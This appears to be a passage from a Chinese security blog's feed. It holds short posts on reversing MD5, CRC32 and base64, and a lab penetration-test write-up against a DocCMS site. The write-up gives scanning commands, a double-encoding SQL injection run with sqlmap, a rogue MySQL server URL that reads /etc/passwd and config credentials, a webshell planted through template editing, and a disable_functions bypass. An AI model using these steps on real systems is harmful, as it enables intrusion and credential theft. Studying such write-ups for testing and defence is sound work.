alt="Untitled"></p><p>但是在trace文件中找不到这个值，也就是说上图中的值应该不是</p><p>按tab找到在汇编中的位置，因为源码中对这些常量用的是加法，所以这里看到ADD就可以在trace文件中搜索c428</p><p><img src="https://s2.loli.net/2022/02/11/9Rfc6D53oJuadhm.png" alt="Untitled"></p><p>在trace文件中找到了这个位置，根据之前常量所在位置可以确定这个值是0x699880d8，缺失的值修改为它就可以了</p><p><img src="https://s2.loli.net/2022/02/11/4DUCcVWq8tp56Gw.png" alt="Untitled"></p><p>继续找另一个缺失的常量0xc33707d6，同样的先定位它前面的常量0x21e1cde6</p><p><img src="https://s2.loli.net/2022/02/11/kTw7xQAN95s4Cjg.png" alt="Untitled"></p><p>在0x21e1cde6和0xf4d50d87之间找了所有add附近的常量都不太像，最后在0x21e1cde6前面的位置找到了，它的值是0xc30737d6，缺失的另一值也找到了，可见在指令执行时位置不绝对按照源码中的顺序来执行的</p><p><img src="https://s2.loli.net/2022/02/11/IZj8S95HPUeuiLY.png" alt="Untitled"></p><p>最后把这两个改变的常量代入到md5算法工具代码中使用，计算出的结果一致了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MD5算法逆向与还原&quot;&gt;&lt;a href=&quot;#MD5算法逆向与还原&quot; class=&quot;headerlink&quot; title=&quot;MD5算法逆向与还原&quot;&gt;&lt;/a&gt;MD5算法逆向与还原&lt;/h1&gt;&lt;h2 id=&quot;算法的识别&quot;&gt;&lt;a href=&quot;#算法的识别&quot; class=&quot;he</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>算法@CRC32算法逆向与还原</title>
    <link href="https://tutucoo.github.io/2022/02/11/%E7%AE%97%E6%B3%95@CRC32%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E4%B8%8E%E8%BF%98%E5%8E%9F/"/>
    <id>https://tutucoo.github.io/2022/02/11/%E7%AE%97%E6%B3%95@CRC32%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E4%B8%8E%E8%BF%98%E5%8E%9F/</id>
    <published>2022-02-11T06:42:37.000Z</published>
    <updated>2022-02-11T06:43:51.048Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CRC32算法逆向与还原"><a href="#CRC32算法逆向与还原" class="headerlink" title="CRC32算法逆向与还原"></a>CRC32算法逆向与还原</h1><h2 id="算法的识别"><a href="#算法的识别" class="headerlink" title="算法的识别"></a>算法的识别</h2><p>经过CRC32加密的密文通常是4个字节长度，可以通过IDA逆向确定它是CRC32算法，方法是找到算法中的常量，通过google搜索会出现CRC32算法相关的搜索结果从而确定它是CRC32算法，下图中的常量0xEDB88320，经过google搜索发现它是CRC32算法 </p><p><img src="https://s2.loli.net/2022/02/11/rWyojAlTKO9qLIu.png" alt="Untitled"></p><h2 id="算法逆向"><a href="#算法逆向" class="headerlink" title="算法逆向"></a>算法逆向</h2><p>逆向目标so，找到CRC32核心算法，CRC32核心算法非常简短，对于这一类算法直接拷贝到clion，进行运行，报错的地方进行修正，直接完成算法还原工具</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> is_init = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> crc32_table[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">crc_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// r0</span></span><br><span class="line">    <span class="keyword">int</span> v1; <span class="comment">// r3</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// r4</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// r5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">256</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        v1 = <span class="number">8</span>;</span><br><span class="line">        v2 = i;</span><br><span class="line">        <span class="keyword">while</span> ( v1 )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = (v2 &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88310</span>;</span><br><span class="line">            <span class="keyword">if</span> ( !(v2 &lt;&lt; <span class="number">31</span>) )</span><br><span class="line">                v3 = v2 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            --v1;</span><br><span class="line">            v2 = v3;</span><br><span class="line">        &#125;</span><br><span class="line">        crc32_table[i] = v2;</span><br><span class="line">    &#125;</span><br><span class="line">    is_init = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">crc32</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">char</span> *a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *v5; <span class="comment">// r5</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// r1</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// r1</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// r1</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// r1</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// r1</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// r1</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// r1</span></span><br><span class="line">    <span class="keyword">int</span> v13; <span class="comment">// r2</span></span><br><span class="line">    <span class="keyword">int</span> v14; <span class="comment">// r3</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v15; <span class="comment">// r1</span></span><br><span class="line">    <span class="keyword">int</span> v16; <span class="comment">// r2</span></span><br><span class="line">    <span class="keyword">int</span> v17; <span class="comment">// r3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!a2)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    v5 = a2;</span><br><span class="line">    <span class="keyword">if</span> (!is_init)</span><br><span class="line"></span><br><span class="line">        crc_init();</span><br><span class="line"></span><br><span class="line">    v6 = ~a1;</span><br><span class="line">    <span class="keyword">while</span> (a3 &gt;= <span class="number">8</span>) &#123;</span><br><span class="line">        a3 -= <span class="number">8</span>;</span><br><span class="line">        v7 = crc32_table[*v5 ^ (<span class="keyword">unsigned</span> <span class="keyword">char</span>)v6] ^(v6 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">        v8 = crc32_table[(<span class="keyword">unsigned</span> <span class="keyword">char</span>)v7 ^ v5[<span class="number">1</span>]] ^(v7 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">        v9 = crc32_table[(<span class="keyword">unsigned</span> <span class="keyword">char</span>)v8 ^ v5[<span class="number">2</span>]] ^(v8 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">        v10 = crc32_table[(<span class="keyword">unsigned</span> <span class="keyword">char</span>)v9 ^ v5[<span class="number">3</span>]] ^(v9 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">        v11 = crc32_table[(<span class="keyword">unsigned</span> <span class="keyword">char</span>)v10 ^ v5[<span class="number">4</span>]] ^(v10 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">        v12 = crc32_table[(<span class="keyword">unsigned</span> <span class="keyword">char</span>)v11 ^ v5[<span class="number">5</span>]] ^ (v11 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">        v13 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)v12 ^ v5[<span class="number">6</span>];</span><br><span class="line">        v14 = v5[<span class="number">7</span>];</span><br><span class="line">        v5 += <span class="number">8</span>;</span><br><span class="line">        v15 = crc32_table[v13] ^ (v12 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">        v6 = crc32_table[(<span class="keyword">unsigned</span> <span class="keyword">char</span> )v15 ^ v14] ^ (v15 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (a3) &#123;</span><br><span class="line">        v16 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            v17 = v5[v16++];</span><br><span class="line">            v6 = crc32_table</span><br><span class="line">                 [v17 ^ (<span class="keyword">unsigned</span> <span class="keyword">char</span> ) v6] ^ (v6 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">        &#125; <span class="keyword">while</span> (a3 != v16);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ~v6;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> str = <span class="string">&quot;kZPpcuZDGquGjAljnCVaq&quot;</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> ret = crc32(<span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) str.data(), str.size());</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,ret);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/02/11/oBETJudfrpChAnH.png" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CRC32算法逆向与还原&quot;&gt;&lt;a href=&quot;#CRC32算法逆向与还原&quot; class=&quot;headerlink&quot; title=&quot;CRC32算法逆向与还原&quot;&gt;&lt;/a&gt;CRC32算法逆向与还原&lt;/h1&gt;&lt;h2 id=&quot;算法的识别&quot;&gt;&lt;a href=&quot;#算法的识别&quot; c</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>算法@base64算法</title>
    <link href="https://tutucoo.github.io/2022/02/11/%E7%AE%97%E6%B3%95@base64%E7%AE%97%E6%B3%95/"/>
    <id>https://tutucoo.github.io/2022/02/11/%E7%AE%97%E6%B3%95@base64%E7%AE%97%E6%B3%95/</id>
    <published>2022-02-11T06:36:41.000Z</published>
    <updated>2022-02-11T06:38:29.621Z</updated>
    
    <content type="html"><![CDATA[<h1 id="base64算法"><a href="#base64算法" class="headerlink" title="base64算法"></a>base64算法</h1><p>下图是对字符串“BC”进行base64编码 </p><p>首先对BC进行二进制分解，分解为8位2进制，接着每6位2进制分为一组，末尾不足的位补0，最后按照ASCII编码表还原字符串，按照6位一组，最少4组，不足的用=号补位</p><p><img src="https://s2.loli.net/2022/02/11/LdSv3RN6GJ7scEZ.png" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;base64算法&quot;&gt;&lt;a href=&quot;#base64算法&quot; class=&quot;headerlink&quot; title=&quot;base64算法&quot;&gt;&lt;/a&gt;base64算法&lt;/h1&gt;&lt;p&gt;下图是对字符串“BC”进行base64编码 &lt;/p&gt;
&lt;p&gt;首先对BC进行二进制分解，分解为</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>web漏洞@记一次Linux内网渗透测试</title>
    <link href="https://tutucoo.github.io/2021/10/03/web%E6%BC%8F%E6%B4%9E@%E8%AE%B0%E4%B8%80%E6%AC%A1Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>https://tutucoo.github.io/2021/10/03/web%E6%BC%8F%E6%B4%9E@%E8%AE%B0%E4%B8%80%E6%AC%A1Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</id>
    <published>2021-10-03T12:10:03.000Z</published>
    <updated>2021-11-05T02:01:25.864Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概况"><a href="#概况" class="headerlink" title="概况"></a>概况</h2><h3 id="攻击主机"><a href="#攻击主机" class="headerlink" title="攻击主机"></a>攻击主机</h3><p>192.168.0.128</p><h3 id="内网1号机"><a href="#内网1号机" class="headerlink" title="内网1号机"></a>内网1号机</h3><p>内网1号机:192.168.0.122/10.10.10.145  密码：yanisy123</p><p>内网1号设置静态ip</p><p>点击编辑连接 </p><p><img src="https://i.loli.net/2021/10/03/A5IwYGpQl34768U.png" alt="Untitled"></p><p>设置静态ip</p><p><img src="https://i.loli.net/2021/10/03/cSA17vs5Fb3IiWx.png" alt="Untitled"></p><p>两张网卡都设置好以后断开重连</p><p><img src="https://i.loli.net/2021/10/03/OJ4cWzASqEt8NUj.png" alt="Untitled"></p><p>内网1号机根目录下有bt.txt，里面有一个宝塔的后台网址以及用户名密码</p><p><img src="https://i.loli.net/2021/10/03/UgutS9EcbJ5NAMn.png" alt="Untitled"></p><p>直接访问8888端口会跳转到login</p><p><img src="https://i.loli.net/2021/10/03/akprXlV2zcPLD9x.png" alt="Untitled"></p><p>80端口直接访问会提示错误，需要在hosts文件中绑定到<a href="http://www.ddd4.com,这好像是宝塔的设定,宝塔后台建立了一个网站www.ddd4.com,无法通过ip直接访问,需要访问域名/">www.ddd4.com，这好像是宝塔的设定，宝塔后台建立了一个网站www.ddd4.com，无法通过ip直接访问，需要访问域名</a></p><p><img src="https://i.loli.net/2021/10/03/caoP9yBvWI3e8xA.png" alt="Untitled"></p><h3 id="内网2号机"><a href="#内网2号机" class="headerlink" title="内网2号机"></a>内网2号机</h3><p>内网2号机:10.10.10.144</p><h2 id="扫描内网主机"><a href="#扫描内网主机" class="headerlink" title="扫描内网主机"></a>扫描内网主机</h2><p>nmap发现内网主机，一共两台，分别是192.168.0.122和192.168.0.109，109是攻击机，122是内网1号机</p><p><img src="https://i.loli.net/2021/10/03/w2vZpGCAzDLfsR3.png" alt="Untitled"></p><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>探1号机端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -v <span class="number">192.168</span><span class="number">.0</span><span class="number">.122</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/03/JDqYguBx1RSmbNQ.png" alt="Untitled"></p><h2 id="扫目录"><a href="#扫目录" class="headerlink" title="扫目录"></a>扫目录</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://www.ddd4.com -w /usr/share/wordlists/dirbuster/directory-<span class="built_in">list</span>-<span class="number">2.3</span>-medium.txt -x <span class="string">&#x27;php,html&#x27;</span> -o <span class="built_in">dir</span>.log --wildcard</span><br></pre></td></tr></table></figure><p>用上面的指令进行扫描时会有很多响应是200，但是长度是一样的，这都是错误页，要将它们过滤掉</p><p><img src="https://i.loli.net/2021/10/03/KNvcbo9AS18IWJs.png" alt="Untitled"></p><p>过滤语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://www.ddd4.com -w /usr/share/wordlists/dirbuster/directory-<span class="built_in">list</span>-<span class="number">2.3</span>-medium.txt -x <span class="string">&#x27;php,html&#x27;</span> -o <span class="built_in">dir</span>.log --wildcard | grep -v <span class="string">&quot;Size: 11807&quot;</span>|grep -v <span class="string">&quot;Size:49&quot;</span></span><br></pre></td></tr></table></figure><h2 id="查看网站信息"><a href="#查看网站信息" class="headerlink" title="查看网站信息"></a>查看网站信息</h2><p>用whatweb查看网站信息 ，不同的域名返回的信息不一样</p><p><img src="https://i.loli.net/2021/10/03/wly4JUdzAWB1ksD.png" alt="Untitled"></p><h2 id="网站搭建"><a href="#网站搭建" class="headerlink" title="网站搭建"></a>网站搭建</h2><p>把ddd4.com的源码下载下来并创建网站进行测试</p><p><img src="https://i.loli.net/2021/10/03/yLBu5qpzl3xmtGf.png" alt="Untitled"></p><p>需要手动在hosts文件中绑定<a href="http://www.duo1.com或者用同步hosts/">www.duo1.com或者用同步hosts</a></p><p>然后访问<a href="http://www.duo1.com进行安装,之后就可以访问了/">www.duo1.com进行安装，之后就可以访问了</a></p><h2 id="代码审计-二次编码"><a href="#代码审计-二次编码" class="headerlink" title="代码审计-二次编码"></a>代码审计-二次编码</h2><p>目标是DocCMS，代码审计要多关注过滤规则，看有没有绕过的方法</p><p>看到很多urldecode函数，这里可能存在二次编码注入</p><p><img src="https://i.loli.net/2021/10/03/YZKvMArpwtRWV4h.png" alt="Untitled"></p><p>原文是11111’，对其进行两次url编码，执行后仍然会被解析成11111’</p><p><img src="https://i.loli.net/2021/10/03/YKQzbNkvaE12CTP.png" alt="Untitled"></p><p>有的时候一次编码会被过滤掉，但是二次编码就可以绕过防护</p><p>调用一些过滤函数，看过滤效果</p><p><img src="https://i.loli.net/2021/10/03/d9jMaPfk4uGl1g3.png" alt="Untitled"></p><p>可以看到对单引号进行了过滤</p><p><img src="https://i.loli.net/2021/10/03/UMXdqhkjzANH5I9.png" alt="Untitled"></p><p>如果对payload进行二次编码则可以绕过</p><p><img src="https://i.loli.net/2021/10/03/O4brdawqne9op6I.png" alt="Untitled"></p><p>找到一处地址存在sql注入，这里checkSqlStr可以用二次url编码绕过</p><p><img src="https://i.loli.net/2021/10/03/EGYBcfI54L1hQ2v.png" alt="Untitled"></p><p>这个函数位于content/search/index.php，所以构造如下，确实存在注入</p><p><img src="https://i.loli.net/2021/10/03/X4Hq3uwUYzBDVfS.png" alt="Untitled"></p><p>sqlmap跑一遍，成功跑出数据  </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u http://www.ddd4.com/search?keyword=11 --dbms mysql -v 1 --tamper chardoubleencode.py</span><br></pre></td></tr></table></figure><h2 id="代码审计-mysql任意文件读取漏洞"><a href="#代码审计-mysql任意文件读取漏洞" class="headerlink" title="代码审计-mysql任意文件读取漏洞"></a>代码审计-mysql任意文件读取漏洞</h2><p>setup/checkdb.php里面有一段代码，这段代码会导致mysql远程连接任意文件读取漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbhost</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;dbhost&#x27;</span>];</span><br><span class="line"><span class="variable">$uname</span>  = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$pwd</span>= <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"><span class="variable">$dbname</span>= <span class="variable">$_REQUEST</span>[<span class="string">&#x27;dbname&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]==<span class="string">&quot;chkdb&quot;</span>)&#123;</span><br><span class="line"><span class="variable">$con</span> = @mysql_connect(<span class="variable">$dbhost</span>,<span class="variable">$uname</span>,<span class="variable">$pwd</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$rs</span> = mysql_query(<span class="string">&#x27;show databases;&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_assoc(<span class="variable">$rs</span>))&#123;</span><br><span class="line"><span class="variable">$data</span>[] = <span class="variable">$row</span>[<span class="string">&#x27;Database&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$rs</span>, <span class="variable">$row</span>);</span><br><span class="line">mysql_close();</span><br><span class="line"><span class="keyword">if</span> (in_array(strtolower(<span class="variable">$dbname</span>), <span class="variable">$data</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]==<span class="string">&quot;creatdb&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$dbname</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$con</span> = @mysql_connect(<span class="variable">$dbhost</span>,<span class="variable">$uname</span>,<span class="variable">$pwd</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (mysql_query(<span class="string">&quot;CREATE DATABASE <span class="subst">&#123;$dbname&#125;</span> DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci&quot;</span>,<span class="variable">$con</span>))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> mysql_error();</span><br><span class="line">&#125;</span><br><span class="line">mysql_close(<span class="variable">$con</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过rogue-mysql-server读取/etc/passwd</p><p><img src="https://i.loli.net/2021/10/03/1tDJyipG5gIlzKd.png" alt="Untitled"></p><p>使用python2.x运行Rogue-MySql-Server服务，运行伪造mysql服务器，等待连接</p><p><img src="https://i.loli.net/2021/10/03/wlCr81MJxY4RZta.png" alt="Untitled"></p><p>访问url触发漏洞,192.168.0.128是攻击机，这里ip进行了更改，为了统一，之后三台主机会分别统称攻击机、内网1号机（1号机）、内网2号机（2号机）</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.ddd4.com/setup/checkdb.php?dbname=mysql&amp;uname=root&amp;pwd=123456&amp;dbhost=192.168.0.128&amp;action=chkdb</span><br></pre></td></tr></table></figure><p>访问url触发，漏洞触发还导致暴露了根目录</p><p><img src="https://i.loli.net/2021/10/03/VsPIgKqbNeXmGZL.png" alt="Untitled"></p><p>再看mysql.log文件，etc/passwd文件内容已经读取到了</p><p><img src="https://i.loli.net/2021/10/03/GgQjRSUpc64TZre.png" alt="Untitled"></p><p>再根据暴露出来的根目录修改脚本，读取doc-config-cn.php文件内容</p><p><img src="https://i.loli.net/2021/10/03/sDlRuv6N859MYqx.png" alt="Untitled"></p><p>可以看到DB_DBNAME、DB_USER、DB_PASSWORD几个字段，有了这些字段就可以连接到目标数据库了</p><p><img src="https://i.loli.net/2021/10/03/4XRGzOEd89KcBNm.png" alt="Untitled"></p><p>连接目标数据库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h192<span class="number">.168</span><span class="number">.0</span><span class="number">.122</span> -uwww_ddd4_com -px4ix6ZrM7b8nFYHn</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/03/ed45rguZpG2SxDs.png" alt="Untitled"></p><h2 id="代码审计-破解算法登陆后台"><a href="#代码审计-破解算法登陆后台" class="headerlink" title="代码审计-破解算法登陆后台"></a>代码审计-破解算法登陆后台</h2><p>这里是后台地址</p><p><img src="https://i.loli.net/2021/10/03/LRsYXUEdKgWr82N.png" alt="Untitled"></p><p>找到源码加密算法</p><p><img src="https://i.loli.net/2021/10/03/qpP34yDzgXLcu79.png" alt="Untitled"></p><p>这里可以在根目录创建一个test.php，然后调用这个算法</p><p><img src="https://i.loli.net/2021/10/03/ncdLmiJRDAjEGaF.png" alt="Untitled"></p><p>admin加密后是33e2…</p><p><img src="https://i.loli.net/2021/10/03/BjkXYWa9uclb2PG.png" alt="Untitled"></p><p>前面已经拿到数据库权限，因此可以修改admin用户名的密码为33e2….，然后就可以通过admin/admin登陆后台了</p><p><img src="https://i.loli.net/2021/10/03/27R3NqxLhugoGIO.png" alt="Untitled"></p><h2 id="代码审计-后台任意文件上传漏洞"><a href="#代码审计-后台任意文件上传漏洞" class="headerlink" title="代码审计-后台任意文件上传漏洞"></a>代码审计-后台任意文件上传漏洞</h2><p>admini\controllers\system\bakup.php</p><p><img src="https://i.loli.net/2021/10/03/fwS2Kti7UgOmpEB.png" alt="Untitled"></p><p>这里过滤了后缀名，不过即使后缀名检测不通过，没有退出机制，文件依然会被上传 </p><p>随便找个上传点测一下参数m表示控制器名称，参数s表示文件名，参数a表示方法名</p><p><img src="https://i.loli.net/2021/10/03/gxub7UceLFZCGMv.png" alt="Untitled"></p><p>把路径修改为uploadsql的路径进行上传，虽然返回错误提示不过在后台可以看到文件已经上传了</p><p><img src="https://i.loli.net/2021/10/03/S8tEyX69GDdlF45.png" alt="Untitled"></p><p><img src="https://i.loli.net/2021/10/03/9h4d2YVrQnZDuKl.png" alt="Untitled"></p><p>不过.htaccess文件禁止了temp目录的访问，因此无法getshell</p><p><img src="https://i.loli.net/2021/10/03/oHQjl7rBXNqdnbt.png" alt="Untitled"></p><h2 id="后台模板编辑getshell"><a href="#后台模板编辑getshell" class="headerlink" title="后台模板编辑getshell"></a>后台模板编辑getshell</h2><p>在后台模板中编辑，插入一句话，重新应用一下模板</p><p><img src="https://i.loli.net/2021/10/03/qwykj7QGzSAVmDN.png" alt="Untitled"></p><p>一句话是插入到首页上面的，所以菜刀连接首页</p><p><img src="https://i.loli.net/2021/10/03/XvtEsCB3FMeAg5m.png" alt="Untitled"></p><p>直接getshell </p><p><img src="https://i.loli.net/2021/10/03/fs3hLtg2bjRkFE4.png" alt="Untitled"></p><h2 id="宝塔命令执行提权"><a href="#宝塔命令执行提权" class="headerlink" title="宝塔命令执行提权"></a>宝塔命令执行提权</h2><p>上面通过模板编辑拿到的shell不能执行命令</p><p><img src="https://i.loli.net/2021/10/03/WZo93aLSxbQNzdl.png" alt="Untitled"></p><p>上传bypass_disablefunc.php、bypass_disablefunc_x64.so、bypass_disablefunc_x86.so到根目录，然后通过下面的payload执行ifconfig命令，这样可以绕过宝塔对命令执行的限制 </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 